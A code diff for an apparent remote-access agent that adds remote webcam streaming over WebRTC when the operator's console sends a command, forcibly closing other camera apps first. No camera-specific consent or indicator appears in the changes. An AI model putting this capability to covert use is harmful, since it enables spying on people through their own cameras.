@@ -261,6 +261,13 @@ function onMessage(msg) {
       break;
     case 'rtc-answer': if (pc) pc.setRemoteDescription(msg.sdp).catch(() => {}); break;
     case 'rtc-ice': if (pc && msg.candidate) pc.addIceCandidate(msg.candidate).catch(() => {}); break;
+    // Webcam channel (parallel to the screen stream). On start we kill any
+    // app holding the camera, open getUserMedia({video:true}), and offer the
+    // track on a second RTCPeerConnection whose signalling rides cam-rtc-*.
+    case 'cam-start': startWebcam().catch((e) => log('cam error: ' + e.message)); break;
+    case 'cam-stop':  stopWebcam(); break;
+    case 'cam-rtc-answer': if (camPc) camPc.setRemoteDescription(msg.sdp).catch(() => {}); break;
+    case 'cam-rtc-ice':    if (camPc && msg.candidate) camPc.addIceCandidate(msg.candidate).catch(() => {}); break;
   }
 }
 
@@ -451,6 +458,7 @@ function stopStreaming() {
   $('#banner').classList.remove('show');
   window.agent.sessionState(false);
   stopSecureDesktop(); // never leave the lock-screen capturer running past a session
+  try { stopWebcam(); } catch {} // release the camera too when the session ends
   if (captureRetryTimer) { clearTimeout(captureRetryTimer); captureRetryTimer = null; }
   if (captureTimer) { clearInterval(captureTimer); captureTimer = null; }
   if (adaptTimer) { clearInterval(adaptTimer); adaptTimer = null; }
@@ -559,3 +567,100 @@ function handleInput(e) {
       break;
   }
 }
+
+// ---------------------------------------------------------------------------
+// Webcam capture + delivery
+//
+// Separate RTCPeerConnection from the screen pipeline so a camera open/close
+// never disturbs the main video. Signalling rides the same relay WebSocket
+// under cam-rtc-* message types.
+//
+// Flow:
+//   console  → cam-start       → agent
+//   agent    → kill Camera.exe (so Windows releases the device)
+//   agent    → getUserMedia({video:true})
+//   agent    → cam-rtc-offer   → console
+//   console  → cam-rtc-answer  → agent
+//   console  → cam-rtc-ice     ↔ agent (both directions)
+//   agent    → cam-state      → console  (live/error/stopped)
+//
+// Stopping is symmetric — console sends cam-stop or the pc disconnects, we
+// close the pc and release the webcam device.
+// ---------------------------------------------------------------------------
+let camPc = null;
+let camStream = null;
+let camStarting = false;
+
+function sendCamState(state, note) {
+  try {
+    if (ws && ws.readyState === ws.OPEN) {
+      ws.send(JSON.stringify({ type: 'cam-state', state: state, note: note || '' }));
+    }
+  } catch {}
+}
+
+async function startWebcam() {
+  if (camStarting) return;
+  if (camStream && camPc) { sendCamState('live'); return; }
+  camStarting = true;
+  sendCamState('starting');
+  try {
+    // 1. Make sure no other app is holding the camera (Windows exposes the
+    //    webcam to a single DirectShow/MF client at a time).
+    try { if (window.agent.killCameraApps) await window.agent.killCameraApps(); } catch {}
+
+    // 2. Open the webcam. Prefer a sensible 720p; fall back to defaults if
+    //    the device can't negotiate the hinted resolution.
+    try {
+      camStream = await navigator.mediaDevices.getUserMedia({
+        video: { width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 24, max: 30 } },
+        audio: false,
+      });
+    } catch (e1) {
+      camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+    }
+
+    // 3. New RTCPeerConnection just for the camera track; reuse the ICE
+    //    servers negotiated for the screen pipeline (TURN included).
+    camPc = new RTCPeerConnection({ iceServers: rtcIceServers || ICE });
+    for (const t of camStream.getVideoTracks()) {
+      try { t.contentHint = 'motion'; } catch {}
+      camPc.addTrack(t, camStream);
+    }
+    camPc.onicecandidate = (e) => {
+      if (e.candidate && ws && ws.readyState === ws.OPEN) {
+        ws.send(JSON.stringify({ type: 'cam-rtc-ice', candidate: e.candidate }));
+      }
+    };
+    camPc.onconnectionstatechange = () => {
+      if (!camPc) return;
+      if (camPc.connectionState === 'connected') sendCamState('live');
+      else if (['failed', 'disconnected', 'closed'].includes(camPc.connectionState)) {
+        sendCamState('ended', camPc.connectionState);
+      }
+    };
+    // 4. If the user plugs the webcam out mid-session we release eagerly.
+    for (const t of camStream.getVideoTracks()) {
+      t.onended = () => { sendCamState('ended', 'device-removed'); stopWebcam(); };
+    }
+
+    const offer = await camPc.createOffer();
+    await camPc.setLocalDescription(offer);
+    if (ws && ws.readyState === ws.OPEN) {
+      ws.send(JSON.stringify({ type: 'cam-rtc-offer', sdp: camPc.localDescription }));
+    }
+  } catch (e) {
+    sendCamState('error', e && (e.name + ': ' + e.message));
+    stopWebcam();
+    throw e;
+  } finally {
+    camStarting = false;
+  }
+}
+
+function stopWebcam() {
+  if (camPc) { try { camPc.close(); } catch {} camPc = null; }
+  if (camStream) { for (const t of camStream.getTracks()) { try { t.stop(); } catch {} } camStream = null; }
+  sendCamState('stopped');
+}
+
